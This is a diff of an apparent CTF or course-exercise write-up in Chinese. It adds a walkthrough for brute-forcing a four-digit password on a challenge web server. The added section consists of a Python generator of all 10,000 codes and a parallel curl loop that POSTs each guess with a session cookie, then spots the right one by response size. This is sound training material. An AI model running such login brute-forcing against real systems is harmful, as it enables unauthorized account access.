@@ -68,3 +68,41 @@ http://mid.macacahub.tw:10120
 > 1. 親手利用 hex editor 把圖片取出
 > 
 > 2. 密碼只有一萬種可能，可以用腳本暴力猜測
+
+#### 腳本暴力解
+用 `python` script 產生所有可能解
+```python=
+#!/usr/bin/python3
+# filename: a.py
+for i in range(0,10):
+    for j in range(0,10):
+        for k in range(0,10):
+            for l in range(0,10):
+                print("{}{}{}{}".format(i, j, k, l))
+```
+
+把解輸出到檔案
+```shell=
+./a.py > pw
+```
+
+列舉密碼檔案暴力去 curl 它
+```shell=
+for i in $(cat pw); do curl 'http://mid.macacahub.tw:10120/' \
+  -H 'Connection: keep-alive' \
+  -H 'Cache-Control: max-age=0' \
+  -H 'Upgrade-Insecure-Requests: 1' \
+  -H 'Origin: http://mid.macacahub.tw:10120' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36' \
+  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
+  -H 'Sec-GPC: 1' \
+  -H 'Referer: http://mid.macacahub.tw:10120/' \
+  -H 'Accept-Language: en-US,en;q=0.9' \
+  -H 'Cookie: session=564a7005-2079-425f-b60f-dc15d348b9a1.3GD_XB9BGY9rr7f1Cdud3SBwqwQ; user=5aa7e63c1b22' \
+  --data-raw "password=$i" \
+  --compressed \
+  --insecure > $i &
+done
+```
+可依據檔案大小，判斷何為密碼。
